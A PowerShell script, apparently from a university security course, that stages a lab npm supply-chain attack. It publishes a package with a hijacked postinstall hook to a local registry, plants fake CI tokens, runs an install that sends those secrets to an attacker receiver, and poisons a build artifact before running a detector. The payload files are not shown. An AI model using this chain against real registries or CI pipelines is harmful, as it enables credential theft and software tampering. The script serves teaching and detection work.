<#
.SYNOPSIS
  [NT230 PoC] Chạy full malicious CI simulation — Demo supply chain attack qua npm.

.DESCRIPTION
  Script này mô phỏng toàn bộ attack chain:
    1. Attacker publish malicious package lên Verdaccio
    2. CI runner chạy npm install → postinstall đánh cắp secrets
    3. CI build step → artifact bị poison
    4. Consumer install → beacon gọi về attacker

  Yêu cầu:
    - Docker Desktop đang chạy (cho Verdaccio)
    - Node.js >= 18
    - Attacker receiver đang lắng nghe (receiver.js)
#>

$ErrorActionPreference = "Stop"
$root = Split-Path -Parent $PSScriptRoot

Write-Host "═" * 60 -ForegroundColor Red
Write-Host "[NT230] MALICIOUS CI SIMULATION — Supply Chain Attack PoC" -ForegroundColor Red
Write-Host "═" * 60 -ForegroundColor Red
Write-Host ""

# ───────────────────────────────────────────────────────────────────────────
# Bước 0: Kiểm tra prerequisites
# ───────────────────────────────────────────────────────────────────────────
Write-Host "[0/6] Checking prerequisites..." -ForegroundColor Yellow

# Check Docker
try {
    docker info 2>$null | Out-Null
    Write-Host "  Docker: OK" -ForegroundColor Green
} catch {
    Write-Host "  Docker: NOT RUNNING — cần Docker để chạy Verdaccio" -ForegroundColor Red
    exit 1
}

# Check Node
if (-not (Get-Command node -ErrorAction SilentlyContinue)) {
    Write-Host "  Node.js: NOT FOUND" -ForegroundColor Red
    exit 1
}
Write-Host "  Node.js: $(node --version)" -ForegroundColor Green

# ───────────────────────────────────────────────────────────────────────────
# Bước 1: Start Verdaccio registry
# ───────────────────────────────────────────────────────────────────────────
Write-Host ""
Write-Host "[1/6] Starting Verdaccio registry..." -ForegroundColor Yellow

Push-Location $root
docker compose -f docker-compose.verdaccio.yml up -d
Start-Sleep -Seconds 3

# Kiểm tra Verdaccio sẵn sàng
try {
    $response = Invoke-WebRequest -Uri "http://localhost:4873" -UseBasicParsing -TimeoutSec 5
    Write-Host "  Verdaccio is running at http://localhost:4873" -ForegroundColor Green
} catch {
    Write-Host "  Verdaccio chưa sẵn sàng, chờ thêm..." -ForegroundColor Yellow
    Start-Sleep -Seconds 5
}
Pop-Location

# ───────────────────────────────────────────────────────────────────────────
# Bước 2: Đổi package sang malicious postinstall + publish
# ───────────────────────────────────────────────────────────────────────────
Write-Host ""
Write-Host "[2/6] Preparing MALICIOUS package..." -ForegroundColor Yellow

$pkgDir = Join-Path $root "packages\safe-marker-package"
$pkgJsonPath = Join-Path $pkgDir "package.json"

# Backup package.json gốc
$pkgJsonBackup = Join-Path $pkgDir "package.json.bak"
if (-not (Test-Path $pkgJsonBackup)) {
    Copy-Item $pkgJsonPath $pkgJsonBackup
    Write-Host "  Backed up original package.json" -ForegroundColor Gray
}

# Đổi postinstall sang malicious script
$pkgJson = Get-Content $pkgJsonPath -Raw | ConvertFrom-Json
$pkgJson.scripts.postinstall = "node scripts/postinstall-ci-attack.js"
$pkgJson.version = "1.0.1"  # bump version để Verdaccio nhận
$pkgJson | ConvertTo-Json -Depth 10 | Set-Content $pkgJsonPath -Encoding UTF8
Write-Host "  package.json updated: postinstall → postinstall-ci-attack.js (v1.0.1)" -ForegroundColor Red

# Publish lên Verdaccio
Push-Location $pkgDir

# Tạo user nếu chưa có (npm adduser)
Write-Host "  Creating Verdaccio user (demo:demo)..." -ForegroundColor Gray
$npmrcPath = Join-Path $pkgDir ".npmrc"
# Dùng npm-cli-login hoặc set auth token trực tiếp
# Token for demo:demo base64 encoded
$authToken = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes("demo:demo"))
Set-Content $npmrcPath "//localhost:4873/:_auth=$authToken`nregistry=http://localhost:4873/`nalways-auth=true" -Encoding UTF8

npm publish --registry http://localhost:4873 2>&1 | ForEach-Object { Write-Host "  $_" -ForegroundColor Gray }
Pop-Location

Write-Host "  Malicious package published to Verdaccio!" -ForegroundColor Red

# ───────────────────────────────────────────────────────────────────────────
# Bước 3: Giả lập CI environment (set fake secrets)
# ───────────────────────────────────────────────────────────────────────────
Write-Host ""
Write-Host "[3/6] Setting up fake CI environment variables..." -ForegroundColor Yellow

# XÓA secrets thật từ máy developer trước khi set fake — tránh leak credentials thật
Write-Host "  Cleaning real secrets from environment..." -ForegroundColor Gray
$sensitivePatterns = @("API_KEY", "SECRET", "TOKEN", "PASSWORD", "CREDENTIAL", "PRIVATE_KEY", "ASKPASS", "AUTH")
foreach ($var in (Get-ChildItem env:)) {
    foreach ($pattern in $sensitivePatterns) {
        if ($var.Name -match $pattern -and $var.Name -notmatch "^(CI_|GITHUB_|AWS_|NPM_|DEPLOY_)") {
            Write-Host "    Removed: $($var.Name)" -ForegroundColor DarkGray
            Remove-Item "env:$($var.Name)" -ErrorAction SilentlyContinue
        }
    }
}

$env:CI = "true"
$env:CI_JOB_TOKEN = "glpat-FAKE-CI-TOKEN-xxxxxxxxxxxx"
$env:CI_PROJECT_PATH = "nt230-demo/supply-chain-victim"
$env:CI_SERVER_URL = "https://gitlab.example.com"
$env:CI_JOB_ID = "12345"
$env:GITHUB_TOKEN = "ghp_FAKE_GITHUB_TOKEN_xxxxxxxxxxxxxxxxxxxx"
$env:AWS_SECRET_ACCESS_KEY = "FAKE+AWS+SECRET+KEY/xxxxxxxxxxxxxxxxxx"
$env:NPM_TOKEN = "npm_FAKE_PUBLISH_TOKEN_xxxxxxxxxxxxxxx"
$env:DEPLOY_KEY = "-----BEGIN RSA PRIVATE KEY----- FAKE_KEY -----END RSA PRIVATE KEY-----"

Write-Host "  CI_JOB_TOKEN     = $env:CI_JOB_TOKEN" -ForegroundColor DarkRed
Write-Host "  GITHUB_TOKEN     = $env:GITHUB_TOKEN" -ForegroundColor DarkRed
Write-Host "  AWS_SECRET_ACCESS_KEY = (set)" -ForegroundColor DarkRed
Write-Host "  NPM_TOKEN        = (set)" -ForegroundColor DarkRed
Write-Host "  DEPLOY_KEY       = (set)" -ForegroundColor DarkRed

# ───────────────────────────────────────────────────────────────────────────
# Bước 4: Tạo baseline artifact hashes (trước khi poison)
# ───────────────────────────────────────────────────────────────────────────
Write-Host ""
Write-Host "[4/6] Creating artifact baseline (pre-attack)..." -ForegroundColor Yellow

$artifactsDir = Join-Path $root "artifacts"
node (Join-Path $root "ci\build-clean.js")
node (Join-Path $root "detector\detect-supply-chain.js") baseline $artifactsDir

# ───────────────────────────────────────────────────────────────────────────
# Bước 5: CI runner chạy npm install (trigger malicious postinstall)
# ───────────────────────────────────────────────────────────────────────────
Write-Host ""
Write-Host "[5/6] CI Pipeline: npm install (triggers secret theft)..." -ForegroundColor Yellow
Write-Host "  ⚠ Postinstall sẽ gửi env vars về attacker server!" -ForegroundColor Red

$consumerDir = Join-Path $root "consumer-app"
Push-Location $consumerDir

# Xoá cache
if (Test-Path "node_modules") { Remove-Item -Recurse -Force "node_modules" }
if (Test-Path "package-lock.json") { Remove-Item -Force "package-lock.json" }

# Install từ Verdaccio — postinstall chạy → secrets bị gửi
npm install @demo/safe-marker-package@1.0.1 --registry http://localhost:4873 2>&1 | ForEach-Object {
    Write-Host "  $_" -ForegroundColor Gray
}
Pop-Location

# ───────────────────────────────────────────────────────────────────────────
# Bước 6: CI step: artifact poisoning
# ───────────────────────────────────────────────────────────────────────────
Write-Host ""
Write-Host "[6/6] CI Pipeline: Artifact poisoning step..." -ForegroundColor Yellow

node (Join-Path $root "ci\inject-malicious-artifact.js")

Write-Host ""
Write-Host "═" * 60 -ForegroundColor Red
Write-Host "[DONE] Attack simulation complete!" -ForegroundColor Red
Write-Host ""
Write-Host "  Check attacker server (receiver.js) for:" -ForegroundColor Yellow
Write-Host "    - POST /exfil/secrets            → stolen CI secrets" -ForegroundColor Yellow
Write-Host "    - POST /exfil/artifact-poison-confirm → poisoned artifact" -ForegroundColor Yellow
Write-Host ""
Write-Host "  Next: Run detector to see if it catches the attack:" -ForegroundColor Cyan
Write-Host "    node detector\detect-supply-chain.js full . artifacts" -ForegroundColor Cyan
Write-Host "    node detector\detect-supply-chain.js verify artifacts" -ForegroundColor Cyan
Write-Host "═" * 60 -ForegroundColor Red

# ───────────────────────────────────────────────────────────────────────────
# Cleanup env vars
# ───────────────────────────────────────────────────────────────────────────
Remove-Item env:CI_JOB_TOKEN -ErrorAction SilentlyContinue
Remove-Item env:CI_PROJECT_PATH -ErrorAction SilentlyContinue
Remove-Item env:CI_SERVER_URL -ErrorAction SilentlyContinue
Remove-Item env:CI_JOB_ID -ErrorAction SilentlyContinue
Remove-Item env:GITHUB_TOKEN -ErrorAction SilentlyContinue
Remove-Item env:AWS_SECRET_ACCESS_KEY -ErrorAction SilentlyContinue
Remove-Item env:NPM_TOKEN -ErrorAction SilentlyContinue
Remove-Item env:DEPLOY_KEY -ErrorAction SilentlyContinue
Remove-Item env:CI -ErrorAction SilentlyContinue
